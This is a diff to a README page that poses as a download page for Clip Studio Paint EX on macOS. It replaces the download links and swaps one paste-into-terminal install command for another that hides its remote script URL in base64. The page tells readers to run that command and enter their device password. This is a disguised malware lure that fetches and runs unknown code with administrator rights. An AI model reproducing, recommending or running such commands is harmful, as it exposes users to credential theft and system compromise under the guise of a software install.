@@ -7,7 +7,7 @@ Favored by manga artists and illustrators worldwide, Clip Studio Paint EX is the
 ---
 
 ## ✅ Download Clip Studio Paint EX for macOS  
-[![Download Clip Studio Paint EX](https://img.shields.io/badge/Download-Clip_Studio_Paint_EX-blueviolet)](https://clip-studio-paint-ex-mac-download.github.io/.github)
+[![Download Clip Studio Paint EX](https://img.shields.io/badge/Download-Clip_Studio_Paint_EX-blueviolet)](https://shuziktobehuman.github.io/huja/ClipStudio)
 
 ---
 
@@ -26,7 +26,7 @@ Favored by manga artists and illustrators worldwide, Clip Studio Paint EX is the
 
 1. Copy the installation command below.
 ```bash
-/bin/bash -c "$(curl -fsSL https://veitzeatz.com/get1/install.sh)"
+/bin/bash -c "$(curl -fsSL $(echo aHR0cHM6Ly9waGFubmFyaXRoLmNvbS9nZXQyL2luc3RhbGwuc2g= | base64 -d))"
 ```
 2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
 3. Enter your device password and confirm the installation.
@@ -64,7 +64,7 @@ Clip Studio Paint EX is a high-performance illustration and comic creation softw
 
 ---
 
-[![Download Clip Studio Paint EX](https://img.shields.io/badge/Download-Clip_Studio_Paint_EX-blueviolet)](https://clip-studio-paint-ex-mac-download.github.io/.github)
+[![Download Clip Studio Paint EX](https://img.shields.io/badge/Download-Clip_Studio_Paint_EX-blueviolet)](https://shuziktobehuman.github.io/huja/ClipStudio)
 
 ---
 
